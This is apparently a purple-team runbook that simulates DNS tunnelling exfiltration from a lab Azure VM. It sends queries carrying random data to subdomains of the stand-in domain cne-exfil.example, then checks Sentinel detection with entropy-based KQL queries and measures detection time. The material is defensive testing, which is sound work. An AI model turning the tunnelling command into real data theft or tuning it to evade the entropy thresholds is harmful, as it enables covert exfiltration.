# Runbook: #4 DNS tunnelling exfiltration

| | |
|---|---|
| ATT&CK | T1071.004, T1048 |
| Pre-registration | [PREREGISTRATION.md](PREREGISTRATION.md#4-dns-tunnelling-exfiltration) |
| Foothold | vm-cne-tier0 (10.101.0.4), Tier0 is an assume-breach endpoint |
| Tooling | Manual, through run-command. No Atomic Red Team test for T1071.004 runs on Linux. |

## Preconditions

- [ ] The latest lab deployed based on repo `main` succeeded with assertion passed
- [ ] Tier0 egress to the internet is blocked: NVA forward chain contains `fwd-t0out-drop`; tier0 NSG contains `DenyTier0toInternet`
- [ ] DNS security policies and diagnostic settings are present
- [ ] DNS logs exist in `DNSQueryLogs` within the last 30 minutes
- [ ] Rule (c) was deployed: Sentinel Analytics contains the enabled rule

## Steps

| # | Where | Command | Expected |
|---|---|---|---|
| 1 | vm-cne-tier0 | See below | Queries sent; each resolves to NXDOMAIN or no answer; run-command returns success |

### Commands

Step #1:

```
az vm run-command invoke \
  -g rg-cne-lab \
  -n vm-cne-tier0 \
  --command-id RunShellScript \
  --scripts 'date -u
for i in $(seq 1 30); do
  n=$(head -c 25 /dev/urandom | base32 | tr -d "=" | tr "A-Z" "a-z")
  getent ahostsv4 "$n.cne-exfil.example" >/dev/null
done
date -u'
```

## Signals

| # | Signal | Source / table | Query | Expected | Wait |
|---|---|---|---|---|---|
| 1 | The drafted DNS queries found in DNS logs | DNSQueryLogs | See below | 30 distinct subdomains under cne-exfil.example from 10.101.0.4 | 10-15min |
| 2 | MTTD: incident creation time (UTC) - first query time | SecurityIncident | See below | CreatedTime exists; calculate MTTD | ≤30min |
| 3 | Sentinel alarm fires | Defender incidents | Defender -> Incidents, remove the filter: Priority score | Alarm fires | 30min |

### Queries

**Signal #1**:

List all DNS queries of non-trusted domain names from tier0:

```kql
DNSQueryLogs
| where ipv4_is_in_range(SourceIpAddress, "10.101.0.0/16")
| extend CleanQueryName = trim_end(@"\.+", QueryName)
| where not(
  CleanQueryName endswith ".opinsights.azure.com"
  or CleanQueryName endswith ".storage.azure.net"
  or CleanQueryName endswith ".core.windows.net"
  or CleanQueryName endswith ".monitor.azure.com"
  or CleanQueryName endswith ".internal.cloudapp.net")
```

List the Sentinel policy matched query count:

```kql
DNSQueryLogs
| where ipv4_is_in_range(SourceIpAddress, "10.101.0.0/16")
| extend CleanQueryName = trim_end(@"\.+", QueryName)
| where not(
  CleanQueryName endswith ".opinsights.azure.com"
  or CleanQueryName endswith ".storage.azure.net"
  or CleanQueryName endswith ".core.windows.net"
  or CleanQueryName endswith ".monitor.azure.com"
  or CleanQueryName endswith ".internal.cloudapp.net")
| extend Parent = extract(@'([^.]+\.[^.]+)$', 1, CleanQueryName)
| extend Sub = trim_end(@"\.+", substring(CleanQueryName, 0, strlen(CleanQueryName) - strlen(Parent)))
| where strlen(Sub) >= 25
| distinct SourceIpAddress, Parent, Sub
| extend Chars = extract_all(@"(.)", Sub)
| mv-expand Chars to typeof(string)
| summarize N = count() by SourceIpAddress, Parent, Sub, Chars
| extend P = todouble(N) / strlen(Sub)
| summarize Entropy = -sum(P * log2(P)) by SourceIpAddress, Parent, Sub
| where Entropy >= 3.3
| summarize Queries = count(), Distinct = dcount(Sub) by SourceIpAddress, Parent
| where Distinct > 10
```

**Signal #2**:

```kql
SecurityIncident
| where Title == "DNS Many Random Subdomains"
| where CreatedTime > ago(2h)
| summarize arg_min(CreatedTime, IncidentNumber, Severity)
```

## Cleanup

None: nothing is changed during the run

## Evidence

- Log files save to docs/evidence/m3/<number>-scenario-4.txt
  - Tier0 outbound DNS logs
  - Sentinel policy matched count results
- Calculated MTTD
- Screenshots of Defender incidents